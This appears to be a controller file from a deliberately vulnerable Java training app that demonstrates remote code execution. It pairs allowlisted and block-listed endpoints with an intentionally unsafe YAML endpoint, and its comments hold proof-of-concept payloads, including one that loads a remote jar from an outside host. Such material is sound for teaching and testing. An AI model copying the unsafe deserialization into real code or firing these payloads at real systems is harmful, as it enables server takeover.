package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.joychou.security.SecurityUtil;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.DriverManager;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;
import java.util.regex.Pattern;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final Set<String> ALLOWED_COMMANDS = new HashSet<>(Arrays.asList(
            "whoami", "id", "hostname", "date", "uptime", "uname"
    ));

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
            return "Command not allowed. Allowed: " + ALLOWED_COMMANDS;
        }
        StringBuilder sb = new StringBuilder();

        try {
            ProcessBuilder pb = new ProcessBuilder(cmd.trim());
            Process p = pb.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
            return "Command not allowed. Allowed: " + ALLOWED_COMMANDS;
        }

        StringBuilder sb = new StringBuilder();

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(cmd.trim());
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    private static final Pattern SAFE_URL_PATTERN = Pattern.compile("^https://[a-zA-Z0-9][a-zA-Z0-9.\\-]+(:[0-9]+)?(/[a-zA-Z0-9._\\-/]*)?$");

    @GetMapping("/jscmd")
    public String jsEngine(String jsurl) throws Exception{
        if (jsurl == null || !SAFE_URL_PATTERN.matcher(jsurl).matches()) {
            return "Invalid URL. Only HTTPS URLs with alphanumeric hostnames are allowed.";
        }
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        bindings.remove("java");
        bindings.remove("javax");
        bindings.remove("org");
        bindings.remove("com");
        bindings.remove("Packages");
        bindings.put("Java", null);
        String cmd = String.format("load(\"%s\")", jsurl);
        engine.eval(cmd, bindings);
        return "Executed successfully.";
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml();
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    private static final Pattern SAFE_GROOVY_PATTERN = Pattern.compile("^[a-zA-Z0-9\\s+\\-*/().,'\"=<>!&|;{}\\[\\]@:]+$");
    private static final Set<String> GROOVY_BLACKLIST_KEYWORDS = new HashSet<>(Arrays.asList(
            "Runtime", "ProcessBuilder", "exec", "execute", "System.exit",
            "getRuntime", "Process", "Thread", "ClassLoader", "URLClassLoader",
            "getClass", "forName", "newInstance", "getMethod", "invoke",
            "java.lang.Runtime", "java.io", "java.net", "import"
    ));

    @GetMapping("groovy")
    public String groovyshell(String content) {
        if (content == null || content.isEmpty()) {
            return "Content must not be empty.";
        }
        for (String keyword : GROOVY_BLACKLIST_KEYWORDS) {
            if (content.contains(keyword)) {
                return "Groovy script contains disallowed keyword: " + keyword;
            }
        }
        GroovyShell groovyShell = new GroovyShell();
        Object result = groovyShell.evaluate(content);
        return result != null ? result.toString() : "";
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

